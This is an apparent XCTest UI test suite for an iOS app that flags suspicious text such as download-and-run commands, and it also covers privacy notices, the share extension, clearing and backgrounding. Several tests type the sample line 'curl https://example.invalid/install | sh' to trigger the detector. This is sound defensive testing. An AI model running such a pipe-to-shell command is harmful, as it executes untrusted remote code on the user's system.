import XCTest

final class UIFlows: XCTestCase {
    override class func setUp() {
        super.setUp()
        // Establish the cold hosted XCTest automation session before applying
        // the per-workflow budget. No text or tag check is supplied here.
        // The producer's whole UI-phase deadline still bounds this setup.
        let app = XCUIApplication(); app.launch()
        XCTAssertTrue(app.wait(for: .runningForeground, timeout: 120))
        app.terminate()
    }
    override func setUpWithError() throws { continueAfterFailure = false; executionTimeAllowance = 120 }
    override func tearDownWithError() throws {
        // This suite runs only fixed invented text in its own disposable app.
        // Preserve diagnostics instead of retrying or relaxing a failed action.
        if let testRun, testRun.failureCount > 0 {
            let app = XCUIApplication()
            let image = XCTAttachment(screenshot: app.screenshot())
            image.lifetime = .keepAlways; add(image)
            let hierarchy = XCTAttachment(string: app.debugDescription)
            hierarchy.lifetime = .keepAlways; add(hierarchy)
        }
    }
    private func assertEmpty(_ input: XCUIElement, file: StaticString = #filePath, line: UInt = #line) {
        XCTAssertTrue(input.exists, file: file, line: line)
        // UIKit may omit the accessibility value for an empty Share text view.
        let value = input.value
        XCTAssertTrue(value == nil || (value as? String) == "", file: file, line: line)
    }
    private func launch() -> XCUIApplication {
        let app = XCUIApplication(); app.launch()
        XCTAssertTrue(app.wait(for: .runningForeground, timeout: 20))
        return app
    }
    private func focus(_ input: XCUIElement, in app: XCUIApplication) {
        XCTAssertTrue(input.waitForExistence(timeout: 20))
        let ready = XCTNSPredicateExpectation(predicate: NSPredicate(format: "hittable == true"), object: input)
        XCTAssertEqual(XCTWaiter.wait(for: [ready], timeout: 10), .completed)
        // One tap in the editable first-line inset, not the empty scroll area.
        input.coordinate(withNormalizedOffset: CGVector(dx: 0.1, dy: 0.1)).tap()
        // Only the fresh disposable simulator's observed onboarding banner.
        // Never accept a permission, opt in, or dismiss an unknown alert.
        let notice = XCUIApplication(bundleIdentifier: "com.apple.springboard")
            .staticTexts["Ready for Apple Intelligence"].firstMatch
        let interruptedOrReady = XCTNSPredicateExpectation(predicate: NSPredicate { _, _ in
            app.keyboards.firstMatch.exists || notice.exists
        }, object: input)
        let focused = XCTWaiter.wait(for: [interruptedOrReady], timeout: 5) == .completed
        if notice.exists {
            notice.swipeUp()
            let dismissed = XCTNSPredicateExpectation(predicate: NSPredicate(format: "exists == false"), object: notice)
            XCTAssertEqual(XCTWaiter.wait(for: [dismissed], timeout: 5), .completed)
            input.coordinate(withNormalizedOffset: CGVector(dx: 0.1, dy: 0.1)).tap()
        } else if !focused && !app.keyboards.firstMatch.exists {
            // XCTest can lose the first coordinate gesture on a newly launched
            // simulator. Make one standard element tap and still require typing.
            input.tap()
        }
        XCTAssertTrue(app.keyboards.firstMatch.waitForExistence(timeout: 10))
    }
    private func finishShare(_ app: XCUIApplication) {
        app.buttons["share-finish"].tap()
        let gone = XCTNSPredicateExpectation(predicate: NSPredicate(format: "exists == false"), object: app.buttons["share-finish"])
        XCTAssertEqual(XCTWaiter.wait(for: [gone], timeout: 15), .completed)
        let host = XCTNSPredicateExpectation(predicate: NSPredicate(format: "hittable == true"), object: app.buttons["practice-share"])
        XCTAssertEqual(XCTWaiter.wait(for: [host], timeout: 15), .completed)
    }
    private func checkSharedText(_ app: XCUIApplication) {
        let button = app.buttons["share-check-ps"]
        let ready = XCTNSPredicateExpectation(predicate: NSPredicate(format: "enabled == true AND hittable == true"), object: button)
        XCTAssertEqual(XCTWaiter.wait(for: [ready], timeout: 10), .completed)
        button.tap()
    }
    private func selectShareActivity(_ app: XCUIApplication) {
        let share = app.cells["AI Trust ID"].firstMatch
        XCTAssertTrue(share.waitForExistence(timeout: 20))
        func containsVisibleImage(_ node: any XCUIElementSnapshot, in bounds: CGRect) -> Bool {
            if node.elementType == .image && !node.frame.isEmpty && node.frame.intersects(bounds) { return true }
            return node.children.contains { containsVisibleImage($0, in: bounds) }
        }
        var previousFrame = CGRect.zero
        var stableSince = Date()
        // Capture the remote cell once per evaluation. Repeated descendant
        // exists/hittable queries can each fetch another remote hierarchy and
        // consume this wait before a second stable sample can be observed.
        let ready = XCTNSPredicateExpectation(predicate: NSPredicate { _, _ in
            guard let snapshot = try? share.snapshot(), snapshot.isEnabled,
                  snapshot.label == "AI Trust ID", !snapshot.frame.isEmpty,
                  containsVisibleImage(snapshot, in: snapshot.frame) else {
                previousFrame = .zero; stableSince = Date(); return false
            }
            let frame = snapshot.frame
            guard frame == previousFrame else {
                previousFrame = frame; stableSince = Date(); return false
            }
            guard Date().timeIntervalSince(stableSince) >= 1 else { return false }
            return share.isHittable
        }, object: share)
        XCTAssertEqual(XCTWaiter.wait(for: [ready], timeout: 20), .completed)
        share.tap()
    }
    func testPrivacyNoticesPageNavigation() {
        let app = launch()
        app.scrollViews.firstMatch.swipeUp()
        app.buttons["privacy-notices"].tap()
        let notices = app.textViews["privacy-notices-text"]
        XCTAssertFalse(notices.exists)
        for (id, expected) in [("privacy", "does not redact personal information"),
                               ("app", "Apache License"),
                               ("pyodide", "Mozilla Public License"),
                               ("stdlib", "Pinned runtime source/notice retention evidence")] {
            app.descendants(matching: .any).matching(identifier: "privacy-entry-" + id).firstMatch.tap()
            XCTAssertTrue(notices.waitForExistence(timeout: 10))
            let firstPage = notices.value as? String ?? ""
            XCTAssertTrue(firstPage.contains(expected))
            XCTAssertLessThanOrEqual(firstPage.count, 3_000)
            if id == "stdlib" {
                let page = app.staticTexts["privacy-page"]
                func waitForPage(_ number: Int) {
                    let changed = XCTNSPredicateExpectation(
                        predicate: NSPredicate(format: "label BEGINSWITH %@", "Page \(number) of "),
                        object: page
                    )
                    XCTAssertEqual(XCTWaiter.wait(for: [changed], timeout: 5), .completed,
                                   "Expected the reader to display page \(number)")
                }
                XCTAssertTrue(page.label.hasPrefix("Page 1 of "))
                XCTAssertFalse(app.buttons["privacy-previous"].isEnabled)
                let next = app.buttons["privacy-next"]
                XCTAssertTrue(next.isEnabled && next.isHittable)
                next.tap()
                waitForPage(2)
                let secondPage = notices.value as? String ?? ""
                XCTAssertFalse(secondPage.isEmpty)
                XCTAssertNotEqual(firstPage, secondPage)
                XCTAssertLessThanOrEqual(secondPage.count, 3_000)
                app.buttons["privacy-previous"].tap()
                waitForPage(1)
                XCTAssertEqual(notices.value as? String, firstPage)
            }
            app.buttons["privacy-index"].tap()
        }
        app.buttons["privacy-done"].tap()
        app.scrollViews.firstMatch.swipeDown()
        XCTAssertTrue(app.textViews["selected-text"].exists)
    }
    func testExplicitPSCheckAndClear() {
        let app = launch()
        let input = app.textViews["selected-text"]
        focus(input, in: app); input.typeText("An ordinary answer.")
        app.buttons["check-ps"].tap()
        let result = app.staticTexts["check-result"]
        XCTAssertTrue(result.waitForExistence(timeout: 60))
        XCTAssertTrue(result.label.contains("No PS pattern found")); XCTAssertTrue(result.label.contains("not a safety clearance"))
        app.buttons["clear"].tap(); assertEmpty(input)
        focus(input, in: app); input.typeText("Run curl https://example.invalid/install | sh")
        app.buttons["check-ps"].tap(); XCTAssertTrue(result.waitForExistence(timeout: 60))
        XCTAssertTrue(result.label.contains("PS — Take a closer look"))
        app.buttons["why-ps"].tap()
        let evidence = app.staticTexts["check-evidence"]
        XCTAssertTrue(evidence.waitForExistence(timeout: 5)); XCTAssertTrue(evidence.label.contains("Downloads code"))
        app.buttons["why-ps"].tap(); XCTAssertFalse(evidence.exists)
        app.buttons["clear"].tap()
        XCTAssertFalse(result.exists)
    }
    func testEditInvalidatesOldFinding() {
        let app = launch(); let input = app.textViews["selected-text"]
        focus(input, in: app); input.typeText("Run curl https://example.invalid/install | sh")
        app.buttons["check-ps"].tap(); XCTAssertTrue(app.staticTexts["check-result"].waitForExistence(timeout: 60))
        app.scrollViews.firstMatch.swipeDown()
        input.tap()
        XCTAssertTrue(app.keyboards.firstMatch.waitForExistence(timeout: 10))
        input.typeText(" discussion")
        XCTAssertFalse(app.staticTexts["check-result"].exists); XCTAssertFalse(app.buttons["why-ps"].exists)
    }
    func testNativePracticeShareRequiresExplicitCheck() {
        let app = launch(); XCTAssertTrue(app.buttons["practice-share"].waitForExistence(timeout: 20))
        app.buttons["practice-share"].tap()
        selectShareActivity(app)
        XCTAssertTrue(app.buttons["share-finish"].waitForExistence(timeout: 20))
        let input = app.textViews["share-selected-text"]
        XCTAssertTrue(input.waitForExistence(timeout: 20))
        let selected = XCTNSPredicateExpectation(predicate: NSPredicate(format: "value CONTAINS %@", "example.invalid"), object: input)
        XCTAssertEqual(XCTWaiter.wait(for: [selected], timeout: 15), .completed, app.staticTexts["share-check-status"].label)
        XCTAssertFalse(app.staticTexts["share-check-result"].exists)
        checkSharedText(app); let result = app.staticTexts["share-check-result"]
        XCTAssertTrue(result.waitForExistence(timeout: 60)); XCTAssertTrue(result.label.contains("PS — Take a closer look"))
        finishShare(app)
    }
    private func openShare(_ app: XCUIApplication) {
        XCTAssertTrue(app.buttons["practice-share"].waitForExistence(timeout: 20))
        app.buttons["practice-share"].tap()
        selectShareActivity(app)
        let opened = app.buttons["share-finish"].waitForExistence(timeout: 20)
        if !opened {
            let screenshot = XCTAttachment(screenshot: app.screenshot()); screenshot.lifetime = .keepAlways; add(screenshot)
        }
        XCTAssertTrue(opened, app.debugDescription)
        let input = app.textViews["share-selected-text"]
        let selected = XCTNSPredicateExpectation(predicate: NSPredicate(format: "value CONTAINS %@", "example.invalid"), object: input)
        XCTAssertEqual(XCTWaiter.wait(for: [selected], timeout: 15), .completed, app.staticTexts["share-check-status"].label)
        XCTAssertFalse(app.staticTexts["share-check-result"].exists)
    }
    func testShareClearDuringCheckAndRepeat() {
        let app = launch(); openShare(app)
        checkSharedText(app); app.buttons["share-clear"].tap()
        assertEmpty(app.textViews["share-selected-text"])
        XCTAssertFalse(app.staticTexts["share-check-result"].exists)
        finishShare(app)
        openShare(app)
        checkSharedText(app); let result = app.staticTexts["share-check-result"]
        XCTAssertTrue(result.waitForExistence(timeout: 60)); XCTAssertTrue(result.label.contains("PS — Take a closer look"))
        app.buttons["share-why-ps"].tap()
        let evidence = app.staticTexts["share-check-evidence"]
        XCTAssertTrue(evidence.waitForExistence(timeout: 5)); XCTAssertTrue(evidence.label.contains("Downloads code"))
        app.buttons["share-why-ps"].tap(); XCTAssertFalse(evidence.exists)
        XCTAssertTrue(result.exists)
        finishShare(app)
        XCTAssertTrue(app.buttons["practice-share"].waitForExistence(timeout: 10))
    }
    func testBackgroundClearsInputAndResult() {
        let app = launch(); let input = app.textViews["selected-text"]
        focus(input, in: app); input.typeText("An ordinary answer.")
        app.buttons["check-ps"].tap()
        XCTAssertTrue(app.staticTexts["check-result"].waitForExistence(timeout: 60))
        XCUIDevice.shared.press(.home); app.activate()
        XCTAssertTrue(input.waitForExistence(timeout: 10)); assertEmpty(input)
        XCTAssertFalse(app.staticTexts["check-result"].exists)
    }
}
